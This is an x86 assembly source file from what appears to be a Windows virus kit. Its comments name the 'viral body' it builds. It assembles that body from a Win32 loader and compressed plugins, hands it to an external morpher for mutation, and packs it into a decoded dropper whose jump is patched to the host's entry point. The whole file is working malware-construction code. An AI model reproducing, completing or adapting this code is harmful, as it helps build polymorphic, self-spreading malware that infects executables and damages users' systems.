
include                 MAKEBODY.INC
include                 ..\..\INCLUDE\consts.inc
include                 ..\..\INCLUDE\PGN2\pgn2.inc
include                 ..\MEMORY\MEMORY.INC
include                 ..\LDRWIN32\ldrwin32.INC

                        extrn   Event:PROC

                        public  build_body
                        public  build_free
                        public  build_dropper

                        p386
                        model   flat
                        locals  __
                        jumps

                        .data

alloc_ptr               dd      0

                        .code

build_free:             push    alloc_ptr
                        call    mfree
                        mov     alloc_ptr, 0
                        retn

sub_1:                  ; free previously allocated block
                        call    build_free

                        ; calc total virus size
                        callW   ldrwin32_getinfo
                        mov     esi, [eax].ldrwin32_size  ; ldrwin32 -- size

                        callW   GetPluginList
__cycle1:               mov     ecx, [eax].list_phys

                        cmp     [ecx].pgn2_version, 100000
                        jae     __skip1

                        add     esi, [ecx].pgn2_compressed
                        add     esi, size pgn2_header
__skip1:
                        mov     eax, [eax].list_next
                        or      eax, eax
                        jnz     __cycle1

                        lea     eax, [esi+4]            ; terminating DD 0

                        mov     [ebp].mbi_vir_size, eax

                        ; alloc memory for viral body

                        add     eax, 4096       ; some additional bytes
                        push    eax
                        callW   malloc

                        mov     alloc_ptr, eax
                        mov     [ebp].mbi_vir_ptr, eax
                        xchg    edi, eax

                        ; init other vars

                        call    ldrwin32_getinfo
                        mov     eax, [eax].ldrwin32_entry
                        mov     [ebp].mbi_vir_currentry, eax

                        ; build viral body

                        ; ldrwin32
                        call    ldrwin32_getinfo
                        mov     esi, [eax].ldrwin32_ptr
                        mov     ecx, [eax].ldrwin32_size
                        rep     movsb

                        ; plugins
                        call    GetPluginList

__cycle2:               mov     esi, [eax].list_phys

                        cmp     [esi].pgn2_version, 100000
                        jae     __skip2

                        mov     ecx, [esi].pgn2_compressed
                        add     ecx, size pgn2_header
                        rep     movsb
__skip2:
                        mov     eax, [eax].list_next
                        or      eax, eax
                        jnz     __cycle2

                        ; terminating DD 0
                        xor     eax, eax
                        stosd

                        ; call external morpher

                        push    ebp
                        push    EV_MAKEBODY_MORPH
                        call    Event
                        add     esp, 8

                        ; keep old addr, in case buffer is reallocated
                        mov     eax, [ebp].mbi_vir_ptr
                        mov     alloc_ptr, eax

                        retn

build_body:             pusha
                        cld

                        mov     ebp, [esp+32+4]    ; makebody_info*
                        call    sub_1
                        or      eax, eax
                        jz      popa_return_0

                        popa

                        mov     eax, 1
                        retn

build_dropper:          pusha
                        cld

                        mov     ebp, [esp+32+4]    ; makebody_info*

                        mov     [ebp].mbi_vir_virtrva, insvir_rva
                        mov     [ebp].mbi_vir_origentry, insjmp_rva+5  ; $+5

                        call    sub_1
                        or      eax, eax
                        jz      popa_return_0

                        push    dropper2_size
                        callW   malloc
                        xchg    edi, eax

                        push    edi
                        push    offset dropper1
                        callW   z_decode
                        add     esp, 8

                        mov     ecx, [ebp].mbi_vir_size
                        cmp     ecx, insvir_max
                        jae     popa_return_0

                        pusha
                        add     edi, insvir_ofs
                        mov     esi, [ebp].mbi_vir_ptr
                        rep     movsb
                        popa

                        push    [ebp].mbi_vir_ptr
                        callW   mfree

                        mov     alloc_ptr, edi
                        mov     [ebp].mbi_vir_ptr, edi
                        mov     [ebp].mbi_vir_size, dropper2_size

                        mov     eax, insvir_rva-(insjmp_rva+5)
                        add     eax, [ebp].mbi_vir_currentry
                        mov     [edi+insjmp_ofs+1], eax

                        mov     eax, [ebp].mbi_datom
                        mov     [edi+insdatom_ofs], eax
                        mov     eax, [ebp].mbi_dsubsys
                        mov     [edi+insdsubsys_ofs], ax

                        popa

                        mov     eax, 1
                        retn

popa_return_0:          popa

                        xor     eax, eax
                        retn

include                 dropper\dropper.ash
include                 dropper\dropper.asi

                        end
